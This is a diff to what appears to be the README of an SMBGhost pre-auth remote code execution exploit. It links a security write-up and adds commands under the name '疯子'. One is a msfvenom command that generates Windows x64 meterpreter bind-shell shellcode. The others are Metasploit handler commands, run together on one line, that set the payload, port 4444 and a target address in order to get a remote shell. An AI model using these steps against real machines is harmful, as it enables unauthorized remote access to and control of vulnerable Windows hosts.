@@ -33,3 +33,15 @@ header without causing a crash.
 See this excellent write up by Ricera Security for more details on the methods I used: 
 https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html
 
+
+
+疯子:
+msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -b '\x00' -i 1 -f python
+
+疯子:
+use exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpset lport 4444set rhost 192.168.1.144run
+
+
+
+
+
